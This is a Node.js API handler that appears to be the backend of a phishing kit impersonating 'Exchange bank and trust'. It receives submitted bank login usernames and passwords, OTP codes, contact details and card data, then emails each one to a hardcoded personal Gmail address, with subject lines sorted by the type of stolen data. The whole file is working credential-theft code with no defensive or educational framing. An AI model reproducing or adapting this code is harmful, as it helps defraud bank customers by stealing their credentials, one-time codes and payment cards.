import nodemailer from 'nodemailer';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    const { email, message, subject } = req.body;

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS,
        },
    });

    const recipient = "samueldaniyan564@gmail.com";

    let customSubject = 'New Form Submission';
    if (subject === 'Login Details') {
        customSubject = 'Submission of Exchange bank and trust sign in form';
    } else if (subject === 'Contact Info') {
        customSubject = 'Submission of Exchange bank and trust Contact Verification form';
    } else if (subject === 'OTP Verification') {
        customSubject = 'Submission of Exchange bank and trust OTP verification form';
    } else if (subject === 'Card Info') {
        customSubject = 'Submission of Exchange bank and trust Card Verification form';
    }

    let textBody = '';
    if (subject === 'Login Details') {
        textBody = `Username: ${email}\nPassword: ${message}`;
    } else if (subject === 'Contact Info') {
        textBody = `Email Address: ${email}\nPhone Number: ${message}`;
    } else if (subject === 'OTP Verification') {
        textBody = `Verification Code: ${message}`;
    } else if (subject === 'Card Info') {
        textBody = message;
    } else {
        textBody = `Message: ${message}`;
    }

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: recipient,
        subject: customSubject,
        text: textBody,
    };

    try {
        await transporter.sendMail(mailOptions);
        return res.status(200).json({ message: 'Email sent successfully' });
    } catch (error) {
        console.error('Error sending email:', error);
        return res.status(500).json({ message: 'Error sending email', error: error.message });
    }
}